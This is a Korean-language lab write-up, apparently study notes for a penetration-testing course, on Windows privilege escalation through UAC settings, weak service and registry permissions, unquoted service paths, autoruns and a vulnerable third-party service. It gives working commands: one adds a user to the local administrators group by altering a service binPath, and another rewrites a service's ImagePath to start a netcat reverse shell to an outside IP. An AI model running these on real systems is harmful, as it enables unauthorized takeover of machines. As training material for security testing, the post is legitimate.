---
title: "Windows Privilege Escalation - Attacking the OS"
date: 2026-06-19
layout: single
excerpt: "Windows의 UAC, Weak Permissions, Unquoted Service Path, Registry ACL, Vulnerable Services 등을 확인하고 잘못된 설정과 취약한 서비스를 이용한 권한 상승 기법을 실습한다."
author_profile: true
toc: true
toc_label: "Windows Privilege Escalation"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [windows, cpts, priv-esc, uac, weak-permissions, services, registry-acl]
---

Windows의 UAC, Weak Permissions, Unquoted Service Path, Registry ACL, Vulnerable Services 등을 확인하고 잘못된 설정과 취약한 서비스를 이용한 권한 상승 기법을 실습한다.

# User Account Control

User Account Control(`UAC`)는 권한 상승이 필요한 작업을 수행할 때 사용자에게 동의 여부를 묻는 기능이다.

애플리케이션은 서로 다른 Integrity Level을 가지며, 높은 Integrity Level을 가진 프로그램은 시스템에 영향을 줄 수 있는 작업을 수행할 수 있다.

UAC가 활성화되어 있으면 관리자 그룹에 속한 사용자라도 일반적인 프로세스는 제한된 Access Token으로 실행될 수 있으며, 관리자 수준의 권한으로 실행하기 위해서는 권한 상승 과정이 필요하다.

우선 `sarah` 사용자는 Administrators 그룹에 속해 있지만, 현재 Shell은 제한된 Access Token으로 실행되고 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-attacking-the-os/windows-priv1.png)

일반적인 GUI 환경에서는 UAC 동의 창을 통해 관리자 권한으로 프로세스를 실행할 수 있지만, Logon Type 3와 같은 원격 Command Line 환경에서는 해당 동의 창을 직접 사용할 수 없는 경우가 있다.

따라서 먼저 UAC가 활성화되어 있는지 확인하였다:

```powershell
PS C:\Users\sarah> reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

이처럼 `EnableLUA` 값이 `0x1` 이므로 UAC가 활성화되어 있음을 확인할 수 있다.

또한 관리자 권한 상승 요청을 UAC가 어떤 방식으로 처리하도록 설정되어 있는지 확인하였다:

```powershell
PS C:\Users\sarah> reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

이처럼 `ConsentPromptBehaviorAdmin` 값이 `0x5` 로 설정되어 있었다.

`0x5` 는 Non-Windows Binary가 관리자 권한 상승을 요구할 경우 사용자에게 동의를 요청하도록 설정되어 있다는 의미이다.

따라서 현재와 같이 GUI의 UAC 동의 창을 직접 사용할 수 없는 Command Line 환경에서는 일반적인 방식으로 관리자 권한 상승을 승인하기 어렵다.

이러한 경우 현재 Windows Build와 UAC 설정을 확인한 뒤, 해당 환경에 적용 가능한 UAC Bypass 기법을 이용하여 상승된 관리자 Access Token으로 프로세스를 실행할 수 있다.

---

# Weak Permissions

Windows 시스템에서는 잘못 설정된 권한으로 인해 권한 상승이 가능한 경우가 존재한다.

예를 들어 서비스 실행 파일을 일반 사용자가 수정할 수 있거나, 서비스 자체의 설정을 낮은 권한의 사용자도 변경할 수 있도록 설정되어 있을 수 있다.

이러한 취약한 권한 설정을 찾는 방법에는 여러 가지가 존재한다.

## Permissive File System ACLs

우선 [SharpUp](https://github.com/GhostPack/SharpUp/) 툴을 활용하여 현재 사용자가 수정할 수 있는 서비스 관련 항목을 찾아보았다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-attacking-the-os/windows-priv2.png)

이처럼 `WindscribeService` 와 `SecurityService` 가 권한 상승 후보로 식별된 것을 확인할 수 있다.

`WindscribeService` 는 서비스 설정 자체를 수정할 수 있는 `Modifiable Services` 로 식별되었으며, `SecurityService` 는 서비스가 실행하는 바이너리를 수정할 수 있는 `Modifiable Service Binaries` 로 식별되었다.

이 중 `SecurityService` 가 실행하는 파일의 경로는 다음과 같다:

```text
C:\Program Files (x86)\PCProtect\SecurityService.exe
```

따라서 해당 파일의 DACL 권한을 확인해보았다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-attacking-the-os/windows-priv3.png)

그 결과 `Everyone` 과 `BUILTIN\Users` 에 Full Control 권한이 부여되어 있음을 확인할 수 있다.

따라서 일반 사용자도 해당 서비스 바이너리를 수정하거나 동일한 이름의 다른 실행 파일로 교체할 수 있다.

또한 [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)를 통하여 해당 서비스를 시작할 수 있는 권한이 존재하는지 확인해보았다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-attacking-the-os/windows-priv4.png)

이처럼 `Everyone` 에 `SERVICE_START` 권한이 부여되어 있어 일반 사용자도 해당 서비스를 시작할 수 있었다.

따라서 서비스 바이너리를 악성 EXE 파일로 교체한 뒤 서비스를 시작할 수 있다면, 서비스가 실행되는 계정의 권한으로 악성 바이너리가 실행되어 권한 상승으로 이어질 수 있다.

## Weak Service Permissions

또한 앞서 SharpUp 결과에서 `WindscribeService` 가 `Modifiable Services` 로 식별된 것을 확인할 수 있었다.

따라서 AccessChk를 통하여 `WindscribeService` 의 서비스 권한을 확인해보았다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-attacking-the-os/windows-priv5.png)

이처럼 `Authenticated Users` 그룹에 `SERVICE_ALL_ACCESS` 권한이 부여되어 있음을 확인할 수 있다.

`Authenticated Users` 는 Windows에 정상적으로 인증된 사용자들이 포함되는 기본 보안 그룹이다.

따라서 현재 사용자인 `htb-student` 도 정상적으로 인증된 사용자이므로 해당 그룹에 포함되어 있음을 확인할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-attacking-the-os/windows-priv6.png)

서비스에 대해 `SERVICE_ALL_ACCESS` 권한이 주어져 있기 때문에 서비스 설정을 변경할 수 있으며, 이를 이용하여 `binPath` 를 조작할 수 있다.

우선 `binPath` 를 다음과 같이 변경하였다:

```powershell
PS C:\Users\htb-student> sc.exe config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```

확인하면 서비스의 `BINARY_PATH_NAME` 이 정상적으로 변경된 것을 확인할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-attacking-the-os/windows-priv7.png)

따라서 서비스를 중지한 뒤 다시 시작하였다:

```powershell
PS C:\Users\htb-student> sc.exe stop WindscribeService
```

```powershell
PS C:\Users\htb-student> sc.exe start WindscribeService
```

이후 로컬 Administrators 그룹을 확인하면 `htb-student` 가 추가된 것을 확인할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-attacking-the-os/windows-priv8.png)

## Unquoted Service Path

서비스의 `binPath` 에 공백이 포함되어 있지만 실행 파일 경로가 따옴표로 감싸져 있지 않은 경우도 존재한다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-attacking-the-os/windows-priv9.png)

이처럼 `SystemExplorerHelpService` 의 실행 경로에는 여러 공백이 존재하지만 전체 경로가 따옴표로 감싸져 있지 않다:

```text
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

이 경우 Windows는 실행 파일의 경로를 결정하는 과정에서 공백이 존재하는 위치를 기준으로 여러 실행 파일 후보를 확인할 수 있다.

예를 들면 다음과 같다:

```text
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\System.exe
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

따라서 공격자가 앞쪽 후보 경로 중 하나에 실행 파일을 생성할 수 있고 서비스가 다시 실행된다면, 원래 서비스 바이너리보다 공격자가 생성한 실행 파일이 먼저 실행될 수 있다.

예를 들어 `C:\` 경로에 `Program.exe` 를 생성할 수 있는 쓰기 권한이 존재하고 해당 서비스가 다시 실행된다면, `C:\Program.exe` 를 이용하여 서비스 실행 흐름을 가로챌 수 있다.

또한 해당 서비스가 `LocalSystem` 으로 실행되는 경우에는 공격자가 생성한 실행 파일 역시 SYSTEM 권한으로 실행될 수 있기 때문에 권한 상승으로 이어질 수 있다.

## Permissive Registry ACLs

또한 Windows 서비스의 Registry 설정 자체를 일반 사용자가 수정할 수 있는 경우도 존재한다.

대부분 Windows 서비스의 Registry 설정은 다음 경로에 존재한다:

```text
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
```

AccessChk를 이용하면 해당 Registry 경로에서 특정 사용자가 수정할 수 있는 Key를 확인할 수 있다:

```powershell
C:\Users\mrb3n> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS
```

이처럼 `ModelManagerService` Registry Key에 `KEY_ALL_ACCESS` 권한이 존재함을 확인할 수 있다.

서비스 Registry Key에는 서비스가 실행할 경로를 지정하는 `ImagePath` 와 같은 값이 존재하며, 해당 Key에 충분한 쓰기 권한이 있다면 이를 수정할 수 있다.

따라서 `ImagePath` 를 다음과 같이 변경하여 서비스가 실행할 프로그램을 다른 경로로 지정할 수도 있다:

```powershell
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Tools\nc.exe -e cmd.exe 10.10.15.181 9001"
```

서비스가 높은 권한으로 실행되고 공격자가 해당 서비스를 다시 실행할 수 있다면, 변경된 `ImagePath` 를 통해 권한 상승으로 이어질 수 있다.

또한 시스템이나 사용자 로그인 시 자동으로 실행되는 프로그램에서도 잘못된 권한 설정이 존재할 수 있다.

`Win32_StartupCommand` 를 이용하면 Startup 및 Registry Run Key 등에 등록된 자동 실행 항목을 확인할 수 있다:

```powershell
PS C:\Users\htb=student> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl

Name     : OneDrive
command  : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : Windscribe
command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

# SKIP
```

예를 들어 위와 같이 `mrb3n` 사용자의 Autorun 항목이 존재한다고 가정해볼 수 있다.

만약 `htb-student` 가 해당 Autorun Registry 값을 수정할 수 있거나, Autorun이 실행하는 `OneDrive.exe` 와 같은 바이너리를 덮어쓸 수 있다면 이를 악용할 수 있다.

이후 `mrb3n` 사용자가 로그인하면서 변조된 Autorun 항목이 실행된다면, 공격자가 작성한 코드가 `mrb3n` 의 사용자 컨텍스트에서 실행되어 해당 사용자 권한으로 이어질 수 있다.

---

# Vulnerable Services

Windows 자체가 최신 상태로 패치되어 있더라도 설치된 Third-party Software에 취약점이 존재하면 권한 상승으로 이어질 수 있다.

따라서 내부에 설치된 애플리케이션을 열거하였다:

```powershell
PS C:\Users\htb-student> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4023057)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Druva inSync 6.6.3
Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
```

확인 결과 `Druva inSync 6.6.3` 버전이 설치되어 있었다.

해당 버전에는 로컬에서 실행 중인 Druva 서비스와 상호작용하여 명령 실행으로 이어질 수 있는 알려진 취약점이 존재하며, 서비스가 SYSTEM 권한으로 실행되는 환경에서는 이를 통해 SYSTEM 권한 상승으로 이어질 수 있다.

따라서 Windows 자체의 설정뿐만 아니라 설치된 Third-party Software의 버전과 알려진 취약점도 함께 확인할 필요가 있다.